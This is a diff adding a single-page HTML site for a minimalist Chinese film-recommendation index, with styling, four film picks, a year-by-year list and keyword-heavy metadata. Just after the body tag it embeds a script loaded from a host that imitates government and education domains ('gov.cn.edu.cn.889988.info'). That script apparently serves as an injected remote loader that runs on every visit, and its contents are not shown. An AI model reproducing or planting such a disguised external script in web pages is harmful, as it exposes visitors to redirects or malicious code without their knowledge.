@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>纤纤影视 - 轻量精选电影与独立短片索引 | 纤纤影视</title>
+<meta name="description" content="纤纤影视（qianqianyingshi-top.github.io）是一个极简精选的影视索引站：只挑少量但值得看的电影、独立短片、纪录片与艺术片，为不想被片荒淹没的人保留一份干净片单。">
+<meta name="keywords" content="纤纤影视, qianqianyingshi-top, 精选电影, 独立短片, 艺术片, 纪录片, 极简片单">
+<meta name="author" content="纤纤影视">
+<meta name="copyright" content="© 2026 纤纤影视">
+<meta property="og:title" content="纤纤影视 - 轻量精选电影与独立短片索引">
+<meta property="og:description" content="只挑少量但值得看的电影、独立短片、纪录片与艺术片，为不想被片荒淹没的人保留一份干净片单。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qianqianyingshi-top.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="canonical" href="https://qianqianyingshi-top.github.io">
+<style>
+/* ============ 极细线条 · 留白高级感 ============ */
+:root{
+  --bg:#fafaf8;
+  --paper:#ffffff;
+  --ink:#1a1a1a;
+  --ink2:#4a4a4a;
+  --muted:#9a9a9a;
+  --line:#e6e4df;
+  --line2:#d8d5ce;
+  --accent:#b8860b;
+  --serif:"Songti SC","SimSun","Noto Serif SC",Georgia,serif;
+  --sans:-apple-system,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:var(--sans);
+  background:var(--bg);
+  color:var(--ink);
+  line-height:1.9;
+  font-size:15px;
+  font-weight:300;
+  -webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 32px}
+
+/* 极简顶栏 */
+header.bar{border-bottom:1px solid var(--line);background:rgba(250,250,248,.94);backdrop-filter:blur(12px);position:sticky;top:0;z-index:1000}
+.bar .wrap{display:flex;align-items:center;justify-content:space-between;height:68px}
+.logo{font-family:var(--serif);font-size:22px;letter-spacing:6px;color:var(--ink)}
+.logo em{font-style:normal;color:var(--accent)}
+.menu{display:flex;gap:38px}
+.menu a{font-size:13px;letter-spacing:2px;color:var(--muted);transition:.3s;position:relative}
+.menu a:hover{color:var(--ink)}
+.menu a::after{content:'';position:absolute;left:0;bottom:-6px;width:0;height:1px;background:var(--accent);transition:.3s}
+.menu a:hover::after{width:100%}
+
+/* 大留白 Hero */
+.hero{padding:140px 0 110px;text-align:center}
+.hero .en{font-size:11px;letter-spacing:8px;color:var(--muted);text-transform:uppercase}
+.hero h1{font-family:var(--serif);font-size:56px;font-weight:400;letter-spacing:10px;margin:26px 0;line-height:1.3}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero .rule{width:60px;height:1px;background:var(--accent);margin:0 auto 28px}
+.hero p{font-size:16px;color:var(--ink2);max-width:560px;margin:0 auto;letter-spacing:1px}
+
+/* 通用 */
+.sect{padding:90px 0}
+.sect-head{text-align:center;margin-bottom:56px}
+.sect-head .no{font-family:var(--serif);font-size:13px;color:var(--accent);letter-spacing:4px}
+.sect-head h2{font-family:var(--serif);font-size:32px;font-weight:400;letter-spacing:5px;margin:14px 0 12px}
+.sect-head p{font-size:14px;color:var(--muted);max-width:520px;margin:0 auto;letter-spacing:.5px}
+.btn{display:inline-block;font-size:12px;letter-spacing:3px;padding:13px 34px;background:transparent;color:var(--ink);border:1px solid var(--ink);cursor:pointer;transition:.35s;font-family:var(--sans)}
+.btn:hover{background:var(--ink);color:#fff;letter-spacing:5px}
+
+/* 栏目一：精选四部 */
+.picks{display:grid;grid-template-columns:repeat(2,1fr);gap:0;border-top:1px solid var(--line2);border-left:1px solid var(--line2)}
+.pick{border-right:1px solid var(--line2);border-bottom:1px solid var(--line2);padding:44px 40px;background:var(--paper);transition:.4s}
+.pick:hover{background:#f4f2ee}
+.pick .idx{font-family:var(--serif);font-size:12px;color:var(--accent);letter-spacing:3px}
+.pick h3{font-family:var(--serif);font-size:24px;font-weight:400;letter-spacing:2px;margin:16px 0 10px}
+.pick .meta{font-size:11px;letter-spacing:2px;color:var(--muted);margin-bottom:16px}
+.pick p{font-size:14px;color:var(--ink2);margin-bottom:20px}
+.pick .more{font-size:12px;letter-spacing:2px;color:var(--accent);border-bottom:1px solid var(--accent);padding-bottom:2px}
+
+/* 栏目二：四个频道 */
+.channels{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line2);border:1px solid var(--line2)}
+.ch{background:var(--paper);padding:46px 26px;text-align:center;transition:.4s}
+.ch:hover{background:#f4f2ee}
+.ch .ic{font-size:30px;font-weight:300;color:var(--accent);font-family:var(--serif)}
+.ch h4{font-family:var(--serif);font-size:18px;font-weight:400;letter-spacing:3px;margin:16px 0 8px}
+.ch p{font-size:12px;color:var(--muted);letter-spacing:1px}
+
+/* 栏目三：编年观影片单 */
+.timeline{border-left:1px solid var(--line2);margin-left:6px;padding-left:0}
+.tl-item{position:relative;padding:0 0 40px 44px}
+.tl-item::before{content:'';position:absolute;left:-5px;top:8px;width:9px;height:9px;border-radius:50%;background:var(--accent);border:2px solid var(--bg)}
+.tl-item .yr{font-family:var(--serif);font-size:13px;letter-spacing:3px;color:var(--accent)}
+.tl-item h4{font-family:var(--serif);font-size:19px;font-weight:400;letter-spacing:2px;margin:4px 0 6px}
+.tl-item p{font-size:14px;color:var(--ink2)}
+
+/* 栏目四：关于 */
+.about{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line2)}
+.about .l{padding:56px;border-right:1px solid var(--line2);background:var(--paper)}
+.about .r{padding:56px;background:#f4f2ee}
+.about h3{font-family:var(--serif);font-size:22px;font-weight:400;letter-spacing:4px;margin-bottom:22px}
+.about p{font-size:14px;color:var(--ink2);margin-bottom:16px}
+.url{display:block;margin:20px 0;padding:16px 18px;border:1px dashed var(--accent);background:#fff;font-family:ui-monospace,monospace;font-size:14px;color:var(--ink);word-break:break-all}
+.about ol{list-style:none;counter-reset:s}
+.about ol li{counter-increment:s;font-size:14px;color:var(--ink2);padding:12px 0 12px 40px;position:relative;border-bottom:1px solid var(--line)}
+.about ol li:last-child{border-bottom:none}
+.about ol li::before{content:counter(s,decimal-leading-zero);position:absolute;left:0;top:12px;font-family:var(--serif);font-size:13px;color:var(--accent)}
+
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:60px 0 40px;background:var(--paper);text-align:center}
+.foot-logo{font-family:var(--serif);font-size:18px;letter-spacing:6px;color:var(--muted);margin-bottom:24px}
+.foot-nav{display:flex;justify-content:center;gap:34px;flex-wrap:wrap;margin-bottom:34px}
+.foot-nav a{font-size:12px;letter-spacing:3px;color:var(--muted)}
+.foot-nav a:hover{color:var(--accent)}
+.copy{font-size:11px;letter-spacing:1px;color:#c0bdb6}
+
+@media(max-width:860px){
+  .wrap{padding:0 22px}
+  .hero{padding:90px 0 70px}
+  .hero h1{font-size:34px;letter-spacing:5px}
+  .picks{grid-template-columns:1fr}
+  .channels{grid-template-columns:repeat(2,1fr)}
+  .about{grid-template-columns:1fr}
+  .about .l{border-right:none;border-bottom:1px solid var(--line2)}
+  .sect{padding:64px 0}
+  .sect-head h2{font-size:25px}
+}
+@media(max-width:600px){
+  .bar .wrap{height:auto;padding:16px 0;flex-direction:column;gap:14px}
+  .menu{width:100%;justify-content:space-between;gap:0;overflow-x:auto;padding-bottom:4px}
+  .menu a{font-size:11px;letter-spacing:1px}
+  .channels{grid-template-columns:1fr 1fr}
+  .hero h1{font-size:27px;letter-spacing:3px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 顶栏 -->
+<header class="bar">
+  <div class="wrap">
+    <a class="logo" href="#">纤纤<em>影视</em></a>
+    <nav>
+      <ul class="menu">
+        <li><a href="#home">首页</a></li>
+        <li><a href="#picks">精选</a></li>
+        <li><a href="#channels">频道</a></li>
+        <li><a href="#timeline">片单</a></li>
+        <li><a href="#about">关于</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+  <!-- Hero -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="en">Qianqian Film &amp; Video</div>
+      <h1>少一点 <em>·</em> 好一点</h1>
+      <div class="rule"></div>
+      <p>纤纤影视（qianqianyingshi-top.github.io）是一个极简精选的影视索引站。我们不堆数量，只挑少量但值得花时间看的电影、独立短片、纪录片与艺术片。</p>
+      <p style="margin-top:26px"><a class="btn" href="#picks">进入精选 →</a></p>
+    </div>
+  </section>
+
+  <!-- 栏目一：精选四部 -->
+  <section class="sect" id="picks">
+    <div class="wrap">
+      <div class="sect-head">
+        <div class="no">I . 精选</div>
+        <h2>这个月只看四部</h2>
+        <p>纤纤影视的选片标准很简单：看完会想跟人聊的，才留下。</p>
+      </div>
+      <div class="picks">
+        <div class="pick">
+          <div class="idx">No. 01</div>
+          <h3>海边的慢日子</h3>
+          <div class="meta">剧情 · 法国 · 2024 · 118 min</div>
+          <p>一个退休邮差在海边小镇重新开始的生活，节奏慢，但每个镜头都在说话。</p>
+          <a class="more" href="#">片单详情 #</a>
+        </div>
+        <div class="pick">
+          <div class="idx">No. 02</div>
+          <h3>第九封来信</h3>
+          <div class="meta">独立短片 · 韩国 · 2023 · 23 min</div>
+          <p>一封始终没寄出的信，九段独白，适合一个人安静看完。</p>
+          <a class="more" href="#">片单详情 #</a>
+        </div>
+        <div class="pick">
+          <div class="idx">No. 03</div>
+          <h3>无人区的鸟</h3>
+          <div class="meta">纪录片 · 冰岛 · 2022 · 96 min</div>
+          <p>跟拍三年，只为了一群迁徙中被遗忘的鸟，画面本身就是答案。</p>
+          <a class="more" href="#">片单详情 #</a>
+        </div>
+        <div class="pick">
+          <div class="idx">No. 04</div>
+          <h3>画框之外</h3>
+          <div class="meta">艺术片 · 日本 · 2025 · 104 min</div>
+          <p>一个画家在失忆后重新学看世界，整部片像一幅慢慢展开的画。</p>
+          <a class="more" href="#">片单详情 #</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：四个频道 -->
+  <section class="sect" id="channels" style="background:#f4f2ee">
+    <div class="wrap">
+      <div class="sect-head">
+        <div class="no">II . 频道</div>
+        <h2>四个方向</h2>
+        <p>纤纤影视按观看心境分库，锚点直达；子页未建时统一 # 占位。</p>
+      </div>
+      <div class="channels">
+        <a class="ch" href="#"><div class="ic">壹</div><h4>电影</h4><p>剧情 / 文艺 / 小语种</p></a>
+        <a class="ch" href="#"><div class="ic">贰</div><h4>短片</h4><p>独立 / 学生 / 实验</p></a>
+        <a class="ch" href="#"><div class="ic">叁</div><h4>纪录</h4><p>自然 / 人物 / 城市</p></a>
+        <a class="ch" href="#"><div class="ic">肆</div><h4>艺术</h4><p>影像 / 装置 / 长镜头</p></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：编年观影片单 -->
+  <section class="sect" id="timeline">
+    <div class="wrap">
+      <div class="sect-head">
+        <div class="no">III . 片单</div>
+        <h2>按年份慢慢看</h2>
+        <p>纤纤影视不追新，只按年份把值得补的旧片排好，一年挑几部就够。</p>
+      </div>
+      <div class="timeline">
+        <div class="tl-item">
+          <div class="yr">2025</div>
+          <h4>画框之外</h4>
+          <p>年度影像感最强的作品，适合安静的夜晚。</p>
+        </div>
+        <div class="tl-item">
+          <div class="yr">2024</div>
+          <h4>海边的慢日子</h4>
+          <p>慢生活题材里少见的克制与真诚。</p>
+        </div>
+        <div class="tl-item">
+          <div class="yr">2023</div>
+          <h4>第九封来信</h4>
+          <p>短片长度的完成度，很多长片都做不到。</p>
+        </div>
+        <div class="tl-item">
+          <div class="yr">2022</div>
+          <h4>无人区的鸟</h4>
+          <p>纪录片该有的耐心，都在镜头里。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：关于 -->
+  <section class="sect" id="about" style="padding-bottom:0">
+    <div class="wrap">
+      <div class="about">
+        <div class="l">
+          <h3>关于纤纤影视</h3>
+          <p>纤纤影视不是一个视频网站，是一份帮你在片荒里做减法的索引。我们不推荐热门，只推荐"看完会想跟人聊"的那几部。</p>
+          <p>名字里的"纤纤"，是量少而精的意思——少一点，好一点。</p>
+          <p>官网：</p>
+          <span class="url">https://qianqianyingshi-top.github.io</span>
+          <p style="font-size:13px;color:var(--muted)">※ 本页为单页静态展示，内页链接以 # 替代，未生成 robots.txt 与 sitemap.xml。提交必应收录可在 Bing Webmaster Tools 使用该首页 URL。</p>
+        </div>
+        <div class="r">
+          <h3>选片四步</h3>
+          <ol>
+            <li>先问自己：这片看完想聊吗？</li>
+            <li>优先看独立短片与冷门旧片。</li>
+            <li>一个月最多留四部，其余都删掉。</li>
+            <li>看完写三行感受，别打分。</li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-logo">纤纤影视</div>
+    <div class="foot-nav">
+      <a href="#home">首页</a>
+      <a href="#picks">精选</a>
+      <a href="#channels">频道</a>
+      <a href="#timeline">片单</a>
+      <a href="#about">关于</a>
+    </div>
+    <p class="copy">© 2026 纤纤影视（https://qianqianyingshi-top.github.io）· 单页静态展示，内页链接以 # 替代</p>
+    <p class="copy" style="margin-top:8px">关键词：纤纤影视 · qianqianyingshi-top · 精选电影 · 独立短片 · 艺术片 · 纪录片</p>
+  </div>
+</footer>
+
+</body>
+</html>
